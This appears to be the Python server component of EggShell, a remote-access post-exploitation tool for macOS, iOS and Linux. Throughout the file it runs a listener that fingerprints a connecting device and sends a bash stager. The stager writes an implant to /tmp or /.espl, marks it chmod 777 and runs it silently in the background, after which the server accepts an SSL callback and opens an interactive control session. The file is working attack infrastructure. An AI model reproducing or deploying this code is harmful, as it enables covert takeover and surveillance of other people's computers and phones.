import socket, ssl, os, json, sys
import helper as h
import session
import binascii
from multihandler import MultiHandler

downloads_dir = "../downloads"

class Server:
    def __init__(self):
        if not os.path.isdir("downloads"):
            os.makedirs("downloads")
        self.macos_architectures = ["i386"]
        self.ios_architectures = ["arm64","armv7s"]
        self.host = None
        self.port = None
        self.debug = False
        self.is_multi = False
        self.modules_macos = self.import_modules("modules/commands/macOS")
        self.modules_ios = self.import_modules("modules/commands/iOS")
        self.modules_local = self.import_modules("modules/commands/local")
        self.modules_universal = self.import_modules("modules/commands/universal")
        self.multihandler = MultiHandler(self)

  
    def import_modules(self,path):
        sys.path.append(path)
        modules = dict()
        for mod in os.listdir(path):
            if mod == '__init__.py' or mod[-3:] != '.py':
                continue
            else:
                m = __import__(mod[:-3]).command()
                #add module info to dictionary
                modules[m.name] = m
        return modules


    def get_modules(self,device_type):
        if device_type == "macos": 
            result = self.modules_macos
        elif device_type == "iOS":
            result = self.modules_ios
        result.update(self.modules_universal)
        return result


    def set_host_port(self):
        try:
            lhost = h.getip()
            lport = None
            choice = raw_input(h.info_general_raw("SET LHOST (Leave blank for "+lhost+")>"))
            if choice != "":
                lhost = choice
            h.info_general("LHOST = " + lhost)
            while True:
                lport = raw_input(h.info_general_raw("SET LPORT (Leave blank for 4444)>"))
                if not lport:
                    lport = 4444
                try:
                    lport = int(lport)
                except ValueError:
                    h.info_general("invalid port, please enter a valid integer")
                    continue
                if lport < 1024:
                    h.info_general("invalid port, please enter a value >= 1024")
                    continue
                break
            h.info_general("LPORT = " + str(lport))
            self.host = socket.gethostbyname(lhost)
            self.port = lport
            return True
        except KeyboardInterrupt:
            return


    def verbose_print(self,text):
        if self.is_multi == False:
            h.info_general(text)


    def debug_print(self,text):
        if self.debug:
            h.info_warning(text)


    def start_single_handler(self):
        session = self.listen_for_stager()
        if session:
            session.interact()


    def start_multi_handler(self):
        self.multihandler.start_background_server()
        self.multihandler.interact()
        print "end start multihandler"


    def craft_payload(self,device_arch):
        # TODO: Detect uid before we send executable
        if not self.host:
            raise ValueError('Server host not set')
        if not self.port:
            raise ValueError('Server port not set')
        payload_parameter = h.b64(json.dumps({"ip":self.host,"port":self.port,"debug":self.debug}))
        if device_arch in self.macos_architectures:
            self.verbose_print("Detected macOS")
            f = open("resources/esplmacos", "rb")
            payload = f.read()
            f.close()
            #save to tmp, 
            instructions = \
            "cat >/private/tmp/tmpespl;"+\
            "chmod 777 /private/tmp/tmpespl;"+\
            "mv /private/tmp/tmpespl /private/tmp/espl;"+\
            "/private/tmp/espl "+payload_parameter+" 2>/dev/null &\n"
            return (instructions,payload)
        elif device_arch in self.ios_architectures:
            self.verbose_print("Detected iOS")
            f = open("resources/esplios", "rb")
            payload = f.read()
            f.close()
            instructions = \
            "cat >/tmp/tmpespl;"+\
            "chmod 777 /tmp/tmpespl;"+\
            "mv /tmp/tmpespl /.espl;"+\
            "/.espl "+payload_parameter+" 2>/dev/null &\n"
            return (instructions,payload)
        else:
            if device_arch == "Linux":
                self.verbose_print("Detected Linux")
            elif "GET / HTTP/1.1" in device_arch:
                raise ValueError("EggShell does not exploit safari, it is a payload creation tool.\nPlease look at the README.md file")
            else:
                h.info_general("Device unrecognized, trying python payload")
            f = open("resources/espl.py", "rb")
            payload = f.read()
            f.close()
            instructions = \
            "cat >/tmp/espl.py;"+\
            "chmod 777 /var/tmp/espl.py;"+\
            "python /tmp/espl.py "+payload_parameter+" &\n"
            return (instructions,payload)


    def listen_for_stager(self):
        #craft shell script
        identification_shell_command = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
        
        #listen for connection
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', self.port))
        s.listen(1)
        self.verbose_print("Listening on port "+str(self.port)+"...")
        try:
            conn, addr = s.accept()
        except KeyboardInterrupt:
            s.close()
            return

        # identify device
        hostAddress = addr[0]
        self.verbose_print("Connecting to "+hostAddress)
        conn.send(identification_shell_command)
        device_arch = conn.recv(128).strip()
        if not device_arch:
            return

        # send bash stager
        try:
            bash_stager, executable = self.craft_payload(device_arch)
        except Exception as e:
            h.info_error(str(e))
            raw_input("Press the enter key to continue")
            return
        self.verbose_print("Sending Payload")
        self.debug_print(bash_stager.strip())
        conn.send(bash_stager)

        # send executable
        self.debug_print("Sending Executable")
        conn.send(executable)
        conn.close()
        self.verbose_print("Establishing Secure Connection...")

        try:
            return self.listen_for_executable_payload(s)
        except ssl.SSLError as e:
            h.info_error("SSL error: " + str(e))
            return
        except Exception as e:
            h.info_error("Error: " + str(e))
            return


    def listen_for_executable_payload(self,s):
        # accept connection
        ssl_con, hostAddress = s.accept()
        s.settimeout(5)
        ssl_sock = ssl.wrap_socket(ssl_con,
                                 server_side=True,
                                 certfile=".keys/server.crt",
                                 keyfile=".keys/server.key",
                                 ssl_version=ssl.PROTOCOL_SSLv23)
        raw = ssl_sock.recv(256)
        device_info = json.loads(raw)
        return session.Session(self,ssl_sock,device_info)
        

    def update_session(self,old_session):
        new_session = self.listen_for_stager()
        old_session.conn = new_session.conn
        old_session.hostname = new_session.hostname
        old_session.username = new_session.username
        old_session.type = new_session.type

   
